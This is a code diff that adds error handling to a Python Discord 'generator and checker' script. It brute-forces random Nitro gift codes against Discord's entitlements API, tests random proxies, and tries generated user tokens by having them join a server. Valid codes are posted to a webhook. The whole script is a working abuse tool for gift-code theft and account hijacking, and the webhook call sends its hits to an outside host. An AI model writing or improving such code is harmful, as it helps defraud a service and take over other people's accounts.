@@ -27,20 +27,25 @@ def generate_proxy():
 # Check the validity of a Nitro Code
 async def check_nitro(session, code):
     url = f"https://discord.com/api/v9/entitlements/gift-codes/{code}?with_application=false&with_subscription_plan=true"
-    async with session.get(url) as response:
-        if response.status == 200:
-            return True
-        return False
+    try:
+        async with session.get(url) as response:
+            if response.status == 200:
+                return code
+            return None
+    except Exception as e:
+        console.print(f"[red]Error checking Nitro code {code}: {e}[/]")
+        return None
 
 # Check if a Proxy is valid
 async def check_proxy(proxy):
     try:
         async with aiohttp.ClientSession() as session:
-            async with session.get('https://httpbin.org/ip', proxy=f"http://{proxy}", timeout=3) as response:
+            async with session.get('https://httpbin.org/ip', proxy=f"http://{proxy}", timeout=5) as response:
                 if response.status == 200:
-                    return True
-    except:
-        return False
+                    return proxy
+    except Exception as e:
+        console.print(f"[red]Error checking proxy {proxy}: {e}[/]")
+        return None
 
 # Check if a User Token is valid by attempting to join a server
 async def check_token(token, server_id):
@@ -49,11 +54,15 @@ async def check_token(token, server_id):
         'Authorization': token,
         'Content-Type': 'application/json'
     }
-    async with aiohttp.ClientSession() as session:
-        async with session.put(url, headers=headers) as response:
-            if response.status == 201:  # 201 = successfully joined
-                return True
-            return False
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.put(url, headers=headers) as response:
+                if response.status == 201:  # 201 = successfully joined
+                    return token
+                return None
+    except Exception as e:
+        console.print(f"[red]Error checking token {token}: {e}[/]")
+        return None
 
 # Main Generator and Checker for Proxies
 async def proxy_gen_and_check():
@@ -68,15 +77,15 @@ async def proxy_gen_and_check():
 
     results = await asyncio.gather(*tasks)
 
-    for result, proxy in zip(results, tasks):
+    for result in results:
         if result:
             valids += 1
-            console.print(f"[green]Valid Proxy: {proxy.result()}")
+            console.print(f"[green]Valid Proxy: {result}[/]")
         else:
             invalids += 1
-            console.print(f"[red]Invalid Proxy: {proxy.result()}")
+            console.print(f"[red]Invalid Proxy[/]")
 
-    console.print(f"[cyan]Proxy Generation Completed! Valid: {valids}, Invalid: {invalids}")
+    console.print(f"[cyan]Proxy Generation Completed! Valid: {valids}, Invalid: {invalids}[/]")
 
 # Main Generator and Checker for Nitro Codes
 async def nitro_gen_and_check():
@@ -92,16 +101,19 @@ async def nitro_gen_and_check():
 
         results = await asyncio.gather(*tasks)
 
-        for result, code in zip(results, tasks):
-            if result:
+        for code in results:
+            if code:
                 valids += 1
-                console.print(f"[green]Valid Nitro Code: {code.result()}")
+                console.print(f"[green]Valid Nitro Code: {code}[/]")
                 # Send valid code to webhook
-                await session.post(webhook_url, json={"content": f"Valid Nitro Code: {code.result()}"})
+                try:
+                    await session.post(webhook_url, json={"content": f"Valid Nitro Code: {code}"})
+                except Exception as e:
+                    console.print(f"[red]Error sending webhook: {e}[/]")
             else:
-                console.print(f"[red]Invalid Nitro Code: {code.result()}")
+                console.print(f"[red]Invalid Nitro Code[/]")
 
-    console.print(f"[cyan]Nitro Generation Completed! Valid Codes: {valids}")
+    console.print(f"[cyan]Nitro Generation Completed! Valid Codes: {valids}[/]")
 
 # Main Generator and Checker for User Tokens
 async def user_token_gen_and_check():
@@ -117,15 +129,15 @@ async def user_token_gen_and_check():
 
     results = await asyncio.gather(*tasks)
 
-    for result, token in zip(results, tasks):
-        if result:
+    for token in results:
+        if token:
             valids += 1
-            console.print(f"[green]Valid Token Joined Server: {token.result()}")
+            console.print(f"[green]Valid Token Joined Server: {token}[/]")
         else:
             invalids += 1
-            console.print(f"[red]Invalid Token: {token.result()}")
+            console.print(f"[red]Invalid Token[/]")
 
-    console.print(f"[cyan]User Token Generation Completed! Valid: {valids}, Invalid: {invalids}")
+    console.print(f"[cyan]User Token Generation Completed! Valid: {valids}, Invalid: {invalids}[/]")
 
 # Main Menu
 def main_menu():
@@ -148,4 +160,3 @@ def main_menu():
 
 if __name__ == "__main__":
     main_menu()
-m
